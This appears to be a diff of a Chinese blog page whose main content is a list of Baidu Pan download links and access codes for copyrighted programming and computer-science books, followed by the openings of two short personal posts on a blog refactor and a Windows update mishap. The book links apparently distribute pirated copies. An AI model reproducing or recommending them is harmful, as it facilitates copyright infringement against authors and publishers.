+<li>2.9《计算机算法设计与分析(王晓东)(第三版)》 <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/17MYsfryX1Rf5-2fqbVJMSg">百度云下载链接</a> 密码: 761w</li>
+<li>2.9《数据结构（C语言版）-严蔚敏 吴伟民, 清华大学出版社, 2007》 <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1ESlmlqTpLi7FirsVZg8hxQ">百度云下载链接</a> 密码: u86s</li>
+<li>2.10《Java数据结构和算法(第二版)》 <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1RnRIRERCTDZCwBHluyAJvA">百度云下载链接</a> 密码: eb8k</li>
+<li>2.11《编程原本》 <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1T3Y3EfF0iBydxRpXNxDF_w">百度云下载链接</a> 密码: 0hfj</li>
+<li>2.12《算法设计手册第2版 中文版330页》 <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1vm8oLORzm6H2eJ9vQVdQ4w">百度云下载链接</a> 密码: 39mu</li>
+<li>2.13《JavaScrit数据结构与算法（第2版）》 <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1Rb-x1zcyWrpTHojP0SL5Og">百度云下载链接</a> 密码: q6uc</li>
+<li>2.14《数据结构与算法分析：C语言描述（原书第2版）》 <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1VDvhmGAzsouiTAfaNqyU4Q">百度云下载链接</a> 密码: gw2k</li>
+<li>2.15《数据结构与算法Python语言描述_裘宗燕编著_北京：机械工业出版社_》 <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1ukn-MQwd_QGd5mB3D9ntPA">百度云下载链接</a> 密码: 6r3v</li>
+<li>3.1《挑战程序设计竞赛(第2版)》 <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1tkpkaQDK4bdIiD0Cyg5ZXg">百度云下载链接</a> 密码: huat</li>
+<li>3.2《算法艺术与信息学竞赛(清华大学出版社)》 <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/10Bb59HDsXfi4_BTNHHtWJQ">百度云下载链接</a> 密码: cebh</li>
+<li>3.3《算法谜题》 <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1DdnBAVc5I0KLcjMs-i6cnw">百度云下载链接</a> 密码: mq4c</li>
+<li>3.4《编程高手箴言》 <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1vX6yEtEjk1yZgB__HDNdbQ">百度云下载链接</a> 密码: 8km9</li>
+<li>4.1《编程之法  面试和算法心得》 <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1IsPuxpRrUsRRVVQcEz83dg">百度云下载链接</a> 密码: cuev</li>
+<li>4.2《程序员代码面试指南 IT名企算法与数据结构题目最优解 》 <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1bjnICFszOoJAfzYg0KH3hg">百度云下载链接</a> 密码: fkug</li>
+<li>4.3《算法Ⅰ-Ⅳ(C++ 实现)–基础、数据结构、排序和搜索(第三版)》 <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1I1EfR2N02ADE2rIHgWvIHg">百度云下载链接</a> 密码: 0mti</li>
+<li>4.4《程序员实用算法》 <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1H4Y6siyhYBX05HQF4Mr9Rw">百度云下载链接</a> 密码: 7t52</li>
+<li>4.5《编程珠玑（第2版）》 <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1wlymzCdyPwlXW4f4BxpaDw">百度云下载链接</a> 密码: nak4</li>
+<li>4.6《编程之美》 <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/16abwOxi0MHkhxGCN1mhtFg">百度云下载链接</a> 密码: stoj</li>
+<li>4.7《程序调试思想与实践》 <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1-LlZDFpzCproicy8GnCcFQ">百度云下载链接</a> 密码: vak1</li>
+<li>4.8《[改变未来的九大算法]管策》 <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1XjSG7HSWBxLDi647KiT2ZQ">百度云下载链接</a> 密码: cr7l</li>
+<li>4.9《排序算法汇总》 <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/171k-I-Mv0rbvd1S0SW40-A">百度云下载链接</a> 密码: 6ah8</li>
+<li>4.10《算法与数据结构-实用算法基础教程》 <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1d_R-FHIaJvJHBp4NaX3eJQ">百度云下载链接</a> 密码: o7hw</li>
+<li>5.1《matlab数学建模算法全收录 799页 47M 超清书签版》 <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1R6L33BQCI0K5-wbeBwpttw">百度云下载链接</a> 密码: m41s</li>
+<li>5.2《常用数据挖掘算法总结及ython实现》 <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/19WGUM9dxgwJfV7STBGRdHw">百度云下载链接</a> 密码: hg4w</li>
+<li>5.3《机器学习十大算法》 <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1HIT3CPnBm4n-GKIWJppa3w">百度云下载链接</a> 密码: 2m1m</li>
+<li>5.4《计算机程序设计艺术 The Art o Comuter rogramming 第2卷（第3版）英文版》 <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1aEBYATT0n_iWhvpMK2Ilpg">百度云下载链接</a> 密码: 1088</li>
+<li>5.5《算法百科 Encycloeia o Algorithms》 <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1u9OH0YVhgBuMdqZ83EREqA">百度云下载链接</a> 密码: toi8</li>
+<li>5.6《智能Web算法(中文版)》 <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1pWRYEAOO4LGE65PozNYDhA">百度云下载链接</a> 密码: dcom</li>
+<li>5.7《现代计算机常用数据结构与算法》 <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1hnQPPC4n5olxSZAO2FOVqg">百度云下载链接</a> 密码: pmu4</li>
+<li>5.8《数据挖掘原理与算法》 <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1IFvMclAodN57sAZtlJJDow">百度云下载链接</a> 密码: ol6i</li>
+<li>5.9《计算几何–算法与应用(中文第三版)》 <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1i4PDjn2txtcBbeizqC8xzw">百度云下载链接</a> 密码: u03e</li>
+<li>5.10《数值最优化算法（numerical otimization）》 <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1FOCXeKhAuqxvMrC-V54MsQ">百度云下载链接</a> 密码: 1d0l</li>
+<li>5.11《计算机图形学原理及算法教程(Visual C++版)-和青芳 清华大学出版社》 <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1FcK4f9HoYm8wvd4COhYZZQ">百度云下载链接</a> 密码: nlmw</li>
+<li>5.12《算法概论（Algorithm)》 <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1fZ1AMW7pJcOXmQYXfpKUjA">百度云下载链接</a> 密码: 4ewo</li>
+<li>5.13《数据结构教程电子版 》 <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1vi1MjxIfH453LpLLaCCDMA">百度云下载链接</a> 密码: 9934</li>
+<li>5.14《图论中的常用经典算法》 <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1mq9UGiM6N3NQYuI_EA4yGA">百度云下载链接</a> 密码: j7a5</li>
+</ul>
+<h1><span id="计算机基础">计算机基础</span></h1><h3><span id="操作系统">操作系统</span></h3><ul>
+<li>30天填自制操作系统       <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1b31YNCIAnHkOO9sTRA7_0Q">百度云下载链接</a>  密码:r616</li>
+<li>操作系统之哲学原理       <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1iL5QooZAupZDN1sqky1few">百度云下载链接</a>  密码:2s4w</li>
+<li>程序是怎样跑起来的       <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1DDEM-UaZjwBo3oZXgZmY8Q">百度云下载链接</a>  密码:4hkh</li>
+<li>深入理解计算机操作系统       <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1EPP25Kc6lXDWr_H5O9Dt2g">百度云下载链接</a>  密码:ef4d</li>
+<li>现代操作系统       <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1fFqOWweoPw3n5_Venu2Uzg">百度云下载链接</a>  密码:354c</li>
+</ul>
+<h3><span id="汇编语言">汇编语言</span></h3><ul>
+<li>汇编语言（注：这边是王爽写的，我觉得写的很好，适合入门）       <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1dhoXB3NPmJ_cdqqsHQNlog">百度云下载链接</a>  密码:tlaf</li>
+</ul>
+<h3><span id="计算机网络">计算机网络</span></h3><ul>
+<li>计算机网络：自顶向下       <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1zHc0qYoGL8oQtnnilYYHAA">百度云下载链接</a>  密码:rs77</li>
+<li>图解HTTP       <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/138ISIyDHhmlyDDWzCvCmSw">百度云下载链接</a>  密码:olev</li>
+<li>图解TC&#x2F;IP       <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1mr1wYHu7h3XGg4rIThyeZg">百度云下载链接</a>  密码:5k33</li>
+<li>网络是怎样连接的       <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1xhjQiPvK2xzWJewackfkhQ">百度云下载链接</a>  密码:d7io</li>
+<li>HTTP权威指南       <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/12weNaVDW5g4H_7XmZOqjIw">百度云下载链接</a>  密码:dfb8</li>
+<li>UNIX网络编程       <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/11H0yH8nc5kPsCYbkdAjhHg">百度云下载链接</a>  密码:2fsl</li>
+</ul>
+<h1><span id="python">Python</span></h1><h3><span id="1-python基础">1、Python基础</span></h3><ul>
+<li>编程小白的第一本Python入门书       <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1M4F6Mzttep63N2zBgDpTtg">百度云下载链接</a>  密码:4c6e</li>
+<li>Python编程初学者指南       <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1bPWdTKqSjoFhhZwOMxUkvQ">百度云下载链接</a>  密码:igr1</li>
+<li>Python高级编程       <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1MVpL_LKI9grSYSNdPPckrg">百度云下载链接</a>  密码:t0di</li>
+<li>Python灰帽子       <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1F_ETqwicy6PPKR2RTeS46w">百度云下载链接</a>  密码:bfqp</li>
+<li>Python开发技术详解       <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/10g_6JCVao9FfwM2EzX0ssA">百度云下载链接</a>  密码:6jwm</li>
+<li>Python开发实战       <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1e94-qxZt1dpiufSCCaSstA">百度云下载链接</a>  密码:23ow</li>
+<li>Python网络编程基础       <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1aZeP6n01gk4vAUKTjtH3Mg">百度云下载链接</a>  密码:7tqp</li>
+<li>Python学习手册       <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1VbYox9fDQy94TkM-X8K4jA">百度云下载链接</a>  密码:hcrk</li>
+</ul>
+<h3><span id="2-数据分析与爬虫">2、数据分析与爬虫</span></h3><ul>
+<li>数据科学入门       <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/14xoJwA_tJck8-8QBXy9EoA">百度云下载链接</a>  密码:9rms</li>
+<li>用Python写网络爬虫       <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1n6fNguPIDvvu8iG_0uM4pA">百度云下载链接</a>  密码:r5dp</li>
+<li>Python数据处理       <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1QTtLIQ2hqMjipvSsjf4m6g">百度云下载链接</a>  密码:o0tv</li>
+<li>Python数据分析实战       <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1JmvXBi7Fw6Mm52Q7E8kkkQ">百度云下载链接</a>  密码:phi0</li>
+<li>Python数据科学手册       <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1sJMO6gqxantGx3KbuA6iwQ">百度云下载链接</a>  密码:9a7o</li>
+<li>Python数据可视化编程实战       <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1ieUc7muCq3UndPimvAe4og">百度云下载链接</a>  密码:1w8m</li>
+<li>精通Scrapy网络爬虫       <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1PgYQIGgZa31hQB9oW_A5-A">百度云下载链接</a>  密码:tcbi</li>
+</ul>
+<h1><span id="linux">Linux</span></h1><ul>
+<li>精通正则表达式       <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1iL7i8Yw6wvbP7rFUoqTDWA">百度云下载链接</a>  密码:f1d4</li>
+<li>鸟哥的Linux私房菜基础篇和服务器篇       <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1IPh8sK73Jz5sMbhQHIzNTg">百度云下载链接</a>  密码:tja9</li>
+<li>深入Linux内核架构       <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1dPGb-8PG7TxSF-Vx-0aByQ">百度云下载链接</a>  密码:47fg</li>
+<li>Linux宝典       <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1Z-eTM0axRKuFIc53ee--bA">百度云下载链接</a>  密码:krrb</li>
+<li>Linux常用命令大全       <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1c4SxBDP5Wu6ko4B-9E_JcQ">百度云下载链接</a>  密码:2pub</li>
+<li>Linux防火墙       <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1ix9N_PIHF6Io1nvZyjH_pQ">百度云下载链接</a>  密码:gok4</li>
+<li>Linux高级程序设计       <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1Med3oV5WOliyGVVmnFfWZg">百度云下载链接</a>  密码:kkvf</li>
+<li>Linux环境编程       <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1lQjGzp1_RqCpx75lObkNXw">百度云下载链接</a>  密码:5h9g</li>
+<li>Linux命令详解词典       <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1deyXJArJXdewfL1pliMUpQ">百度云下载链接</a>  密码:es5e</li>
+<li>汇编语言基于linux环境第3版       <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1eGBRGh_2iyElhKUa3bkJNg">百度云下载链接</a>  密码:g99m</li>
+</ul>
+<h1><span id="c语言">C语言</span></h1><ul>
+<li>经典C程序100例       <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1edLxfx9u2-PmuKst-YBLPw">百度云下载链接</a>  密码:afk7</li>
+<li>C Primer Plus       <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1_PyTRveKFrxT6hL2GnFoCA">百度云下载链接</a>  密码:fod7</li>
+<li>C程序设计语言（包括课后答案等）       <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1iLk2xuhW500RmN2jlmgMPQ">百度云下载链接</a>  密码:b840</li>
+<li>C和指针       <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1_ADlbuRudlG6e8rksNJtVQ">百度云下载链接</a>  密码:76qm</li>
+<li>C语言编程精粹       <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1YU_Ds6Y4oguhQamuu_oiig">百度云下载链接</a>  密码:e3vm</li>
+<li>C语言参考手册       <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1gc2e_Ugj32DjkLIKNlWAEA">百度云下载链接</a>  密码:8hvu</li>
+<li>C语言函数大全       <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1tmkSbKVDMI52uSZJ6fxslA">百度云下载链接</a>  密码:vimv</li>
+<li>C语言解析教程       <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1VqGxVk5s5eokdZNXcWOBpQ">百度云下载链接</a>  密码:64a3</li>
+<li>C语言深度剖析       <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1QwTqORJiwwslNOLf6k_aiA">百度云下载链接</a>  密码:i8jv</li>
+<li>C专家编程       <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1dd6M8HCKheJ-wHsHTmho9w">百度云下载链接</a>  密码:46ds</li>
+</ul>
+<h1><span id="c">C++</span></h1><ul>
+<li>C++ Primer       <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1aKFtG_VD9mh2VKQ4tsAHQQ">百度云下载链接</a>  密码:2rdb</li>
+<li>C++编程思想       <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1ffEEUgPL96GiU9P_Otr5_w">百度云下载链接</a>  密码:s033</li>
+<li>C++对象模型       <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/105Q4sVBeho1jUGnQOG4CuA">百度云下载链接</a>  密码:4n4j</li>
+<li>深入探索C++对象模型       <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/123cO7E9e6YZKlHi22JRgYg">百度云下载链接</a>  密码:e1vr</li>
+<li>C++ Templates       <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1di4dwRI0RGvKUNh871uHGA">百度云下载链接</a>  密码:btl8</li>
+<li>C++编程规范-101条规则准则与最佳实践       <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1dhbeeD_SOYV7Nus163RWqg">百度云下载链接</a>  密码:qwlv</li>
+<li>C++沉思录中文第2版       <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1PVHIZhCWGyyQc-GYokUObw">百度云下载链接</a>  密码:oiqw</li>
+<li>C++大学教程       <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/12YYBfp7CrHPPCklq0EefQg">百度云下载链接</a>  密码:s7iq</li>
+<li>C++设计新思维-泛型编程与设计之应用       <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1sDxLIzWX6VKz4JNHkqgYxA">百度云下载链接</a>  密码:p40u</li>
+<li>Effective STL 中文版       <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1LP5_fdZKVLU3PQrZIUhuBA">百度云下载链接</a>  密码:pqrp</li>
+<li>More Effective C++中文版       <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1rE__8jOgRbwAU7FBhr10wQ">百度云下载链接</a>  密码:e4mf</li>
+<li>STL源码剖析       <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1mSeubHkR7CPHJDhO9Wzpgg">百度云下载链接</a>  密码:dadw</li>
+</ul>
+<h1><span id="人工智能">人工智能</span></h1><ul>
+<li>贝叶斯思维统计建模的Python学习法       <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1ww67WhfgMzb1Qk0OisAvoQ">百度云下载链接</a>  密码:ffik</li>
+<li>机器学习实战       <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/14c72CKFR7VNS0ZpjB04X_A">百度云下载链接</a>  密码:4fns</li>
+<li>Python机器学习及实践       <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1K3Ni-f0m9pRpHVsVWLbKrQ">百度云下载链接</a>  密码:ah7s</li>
+<li>Tensorflow实战Google深度学习框架       <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/18_vSmv7gal4bsbaI8FYCkQ">百度云下载链接</a>  密码:1vcd</li>
+<li>TensorFlow实践与智能系统       <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1ZHTmOQnYjUhzhcPAzRcAKA">百度云下载链接</a>  密码:e0i9</li>
+<li>深度学习_中文版       <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1kIB3C6l3kiQ98Vsz17CcbQ">百度云下载链接</a>  密码:w7k4</li>
+</ul>
+<h1><span id="设计模式">设计模式</span></h1><ul>
+<li>图解设计模式       <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1Hc38I4KIhcQvqHHR4QdNng">百度云下载链接</a>  密码:5k00</li>
+<li>研磨设计模式       <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1Qm8volX57TVAJSDRiAGOzQ">百度云下载链接</a>  密码:q03j</li>
+<li>Head First设计模式       <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1312h6li1Eg5_mS_tcGdLrg">百度云下载链接</a>  密码:hidi</li>
+</ul>
+<h1><span id="java">Java</span></h1><h3><span id="java-基础">Java 基础</span></h3><ul>
+<li>阿里巴巴Java开发手册.zip <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1anieuNnWxhK0frWRQXoNYg">百度云下载链接</a>  提取码: f0wg</li>
+<li>代码大全.zip <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1xntdPBakX5psx0lz194Lew">百度云下载链接</a>  提取码: ebfh</li>
+<li>代码整洁之道.zip <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1Rg_TMSHxSUj3Ig_o523z7Q">百度云下载链接</a>  提取码: 8nng</li>
+<li>码出高效.zip <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1Gd9hkm5TK5N8BcZYAh5HVQ">百度云下载链接</a>  提取码: qhlt</li>
+<li>敏捷软件开发.zip <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1yN8D2kRiHZZ2nmSvs1CsYg">百度云下载链接</a>  提取码: oeww</li>
+<li>轻量级JavaEE企业应用实战.zip <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1BXylPQoWrJbZFC0lCm9mXw">百度云下载链接</a>  提取码: ee2o</li>
+<li>深入分析JavaWeb技术内幕.zip <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/18NhOO5Xt84vk5h7xVIOTHQ">百度云下载链接</a>  提取码: mg6b</li>
+<li>深入理解Java虚拟机.zip <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1hJxYemMfx38m3kAxyDr_qw">百度云下载链接</a>  提取码: 36eu</li>
+<li>深入剖析Tomcat.zip <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1oe6fB__eEXphSSsmNN3DsQ">百度云下载链接</a>  提取码: l5fr</li>
+<li>Camel in Action.zip <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1TyDou9Ik8zWrB3ajCoivrQ">百度云下载链接</a>  提取码: 7md7</li>
+<li>Effective Java.zip <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1UbP1sOVdYRZuDcWdm3FW_A">百度云下载链接</a>  提取码: 1si0</li>
+<li>Effective Java（英文版）《防失效，搅乱书名》.zip <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1v3oFZpL03S8QcL4EI35u6w">百度云下载链接</a>  提取码: tq4f</li>
+<li>Head First Java.zip <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1ifUrzpPq01wUFjppaOsbUA">百度云下载链接</a>  提取码: gq2k</li>
+<li>Head First Servlet and JSP.zip <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1PdlMdRXgGCJHNQMgMbwk2A">百度云下载链接</a>  提取码: vlgp</li>
+<li>Java8实战.zip <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1kkRnapre9aHHaKDjxeZd-g">百度云下载链接</a>  提取码: 5uil</li>
+<li>Java编程思想.zip <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1Rrxxbl0SzhErS3bGChSo8A">百度云下载链接</a>  提取码: hpe9</li>
+<li>Java并发编程的艺术.zip <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1x0xHC8dOJVvTTlqVMIPMlA">百度云下载链接</a>  提取码: 8hid</li>
+<li>Java并发编程实践.zip <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1Q56joLuLvMUUM4oVVlnkMQ">百度云下载链接</a>  提取码: qjf8</li>
+<li>Java从小白到大牛.zip <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1I-BAP4iUBfSSJFXRvA-yuA">百度云下载链接</a>  提取码: vncd</li>
+<li>Java核心技术.zip <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1CoKTy2mPcIQW0XjWPE6XAw">百度云下载链接</a>  提取码: 7wlo</li>
+<li>Java性能优化权威指南.zip <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1Sr20FUrgVYvlhHZ0WGF7wQ">百度云下载链接</a>  提取码: ghs9</li>
+<li>Maven实战.zip <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1oIUZHMQ9JiEIEK8THmQRWQ">百度云下载链接</a>  提取码: a0e9</li>
+<li>Spring实战.zip <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1Sgmt5LPQMtr67Y6kSPvl7A">百度云下载链接</a>  提取码: 6dao</li>
+</ul>
+<h1><span id="数据库">数据库</span></h1><ul>
+<li>高性能MySQL       <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1qjILjMsxNZrGFOpgsbH5DA">百度云下载链接</a>  密码:4g3g</li>
+<li>深入浅出MySQL       <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1AZT75ENobXq6HqhCzEBKBA">百度云下载链接</a>  密码:vbve</li>
+<li>MongoDB权威指南       <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1rITlCutBkybPPY1mwyq_Nw">百度云下载链接</a>  密码:jr88</li>
+<li>MySQL必知必会       <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1rcqkimg5wuWzU7SYBBANTA">百度云下载链接</a>  密码:v5jg</li>
+<li>MySQL技术内幕InnoDB存储引擎        <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1A0JrWuQlCnKSxrEaezNKdA">百度云下载链接</a>  密码:c2tv</li>
+<li>SQL查询的艺术       <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/10qcO-rCGx1JLqRlM3XbxnA">百度云下载链接</a>  密码:j462</li>
+<li>SQLite 权威指南       <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1koxDAAGgWQNY9RfkhWImGw">百度云下载链接</a>  密码:ewv1</li>
+</ul>
+<h1><span id="go">Go</span></h1><ul>
+<li>学习Go语言       <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/17-NxoWoQwQSFzK2UG7h9Yw">百度云下载链接</a>  密码:eut4</li>
+<li>Go语言实战       <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1HQGWVQc5TvO5_eLbt9AY5A">百度云下载链接</a>  密码:bauv</li>
+<li>Go web编程       <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/17dKezZPos8TuHfvCxw8DEQ">百度云下载链接</a>  密码:aenp</li>
+<li>C 程序设计语言第2版       <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/115FdJH6AadPtGB0msY1G9Q">百度云下载链接</a>  密码:liqm</li>
+</ul>
+<h1><span id="面试相关">面试相关</span></h1><ul>
+<li>阿里巴巴Java面试问题大全       <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/15TtNHL5AVL94K1ROP1bwPA">百度云下载链接</a>  密码:f7v3</li>
+<li>程序员面试宝典       <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1Yxi_WX5Ho9RS3GeiUIFYTQ">百度云下载链接</a>  密码:v21s</li>
+<li>大厂面试真题       <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1wwhW-ZoU-LrhHr85-wIHUQ">百度云下载链接</a>  密码:qtis</li>
+<li>Java面试突击       <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1s-nUxqYpT2ME9olzk2dbVg">百度云下载链接</a>  密码:35sp</li>
+</ul>
+<p>书籍全部来源于网络其他人的整理，我这里只是收集整理了他们的链接，如有侵权，马上联系我，我立马删除对应链接。我的邮箱：<a href="mailto:&#x31;&#x33;&#x36;&#50;&#51;&#x30;&#53;&#53;&#x39;&#48;&#x40;&#113;&#113;&#x2e;&#x63;&#x6f;&#109;">&#x31;&#x33;&#x36;&#50;&#51;&#x30;&#53;&#53;&#x39;&#48;&#x40;&#113;&#113;&#x2e;&#x63;&#x6f;&#109;</a></p>
+</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-07-07T06:10:58.000Z" title="2021/7/7 14:10:58">2021-07-07</time>发表</span><span class="level-item"><time dateTime="2022-10-12T04:03:19.294Z" title="2022/10/12 12:03:19">2022-10-12</time>更新</span><span class="level-item"> xeonds </span><span class="level-item">几秒读完 (大约82个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/07/07/%E5%8F%88%E6%83%B3%E9%87%8D%E6%9E%84%E5%8D%9A%E5%AE%A2%E4%BA%86.jpg%EF%BC%88/">又想重构博客了.jpg（</a></h1><div class="content"><p>本来吧，是想直接从头开始，重写一个新的版本。结果写到一半发现，还是直接改方便（</p>
+<p>后面打算分离程序和数据，用json存储设置数据，提高灵活性，可维护性之类的。</p>
+<p>在写了在写了.jpg（</p>
+</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-07-04T15:54:27.000Z" title="2021/7/4 23:54:27">2021-07-04</time>发表</span><span class="level-item"><time dateTime="2022-10-12T04:07:56.527Z" title="2022/10/12 12:07:56">2022-10-12</time>更新</span><span class="level-item"> xeonds </span><span class="level-item">4 分钟读完 (大约598个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/07/04/%E7%94%A8%E7%81%AB%E7%BB%92%E7%9A%84%E4%B8%80%E6%AC%A1%E7%BF%BB%E8%BD%A6%E7%BB%8F%E5%8E%86%EF%BC%88/">用火绒的一次翻车经历（</a></h1><div class="content"><h3><span id="概要">概要</span></h3><p>昨天下午，在被一堆人安利了Windows11之后，咱看了看电脑上还是20H1的Win10，留下了悔恨的泪水（不是）。于是决定不管怎么着吧，起码先更新到20H2吧？</p>
+<p>说干就干。开始启用Windows Update。嗯？怎么不行？哦，那就把注册表，组策略之类的都改一改吧（）于是，输入gpedit.msc，它告诉我被禁用了。。。被禁用了。。。禁用了。。。</p>
